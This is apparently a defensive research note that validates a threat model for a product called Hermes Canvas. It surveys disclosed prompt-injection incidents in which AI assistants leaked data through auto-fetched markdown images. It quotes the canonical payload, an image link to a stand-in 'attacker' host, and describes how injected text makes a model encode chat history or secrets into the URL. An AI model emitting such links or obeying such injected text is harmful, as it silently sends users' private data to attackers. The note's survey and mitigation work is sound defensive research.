# Real-world AI markdown/image exfiltration incidents (threat-model validation)

- Type: PRIMARY (researcher disclosures) — Johann Rehberger / Embrace The Red,
  Simon Willison, PromptArmor
- Tag: prompt-injection
- Accessed: 2026-07-13
- URLs:
  - https://embracethered.com/blog/posts/2023/chatgpt-webpilot-data-exfil-via-markdown-injection/
  - https://simonwillison.net/2025/Aug/15/the-summer-of-johann/
  - https://x.com/simonw/status/1869046253683966205
  - https://www.promptfoo.dev/blog/lethal-trifecta-testing/

## The recurring pattern (same bug, many vendors)

Prompt injection makes the AI emit a **markdown image** whose URL smuggles private
data in the query string; the client auto-fetches it → silent exfiltration.
Verbatim canonical payload (Rehberger, ChatGPT, disclosed to OpenAI 2023-04-09):

    ![data exfiltration in progress](https://attacker/q=*exfil_data*)

The model is told to summarize/base64-encode chat history/secrets and append as
`?data=...`. No user click needed — rendering the image IS the fetch.

## Documented affected surfaces (dates)

- **ChatGPT** (markdown image / plugins), 2023 — OpenAI initially called it "a
  feature"; later added a url_safe / server-side image proxy check.
- **Google Bard**, 2023 (Rehberger) — base64-encode data into an attacker image URL.
- **Writer.com, Amazon Q, Google NotebookLM, xAI/Grok, Anthropic** — Simon Willison
  running list (tweet 2024-12-17): "Add Anthropic to a list that already included
  xAI, Google NotebookLM, ChatGPT, Amazon Q and more."
- **GitHub Copilot Chat**, 2025 — "From Prompt Injection to Data Exfiltration";
  fix was to **disable markdown image references to untrusted domains**.
- **Slack AI**, 2024 (PromptArmor) — cross-channel exfil via poisoned message +
  Slack link-unfurl / image preview.
- **Microsoft 365 Copilot "EchoLeak"** (CVE-2025-32711, Aim Security) — zero-click
  email → auto-fetched image + Teams-proxy egress (see separate capture).

## The mental model — Simon Willison's "lethal trifecta"

Danger = (A) access to private data + (B) exposure to untrusted content +
(C) ability to exfiltrate (send data out). Remove any leg and the attack fails.
For rendered artifacts the exfil leg is the outbound `<img>`/fetch — CSP
`img-src`/`connect-src` lockdown removes leg (C).

## Common mitigation across ALL fixes

Block/deny image+network egress to non-allowlisted domains (CSP img-src/connect-src,
or server-side image proxy). Allowlists get bypassed via shared buckets / open
redirects, so `'none'` is safest.

## Relevance to Hermes Canvas

Validates the threat model: even without cookie theft, a rendered agent surface can
leak the user's data through a single `<img>` beacon. Hermes MUST ship a strict
egress CSP on the artifact origin, not just origin isolation.
- Confidence: HIGH (multiple named-researcher primary disclosures, cross-vendor).
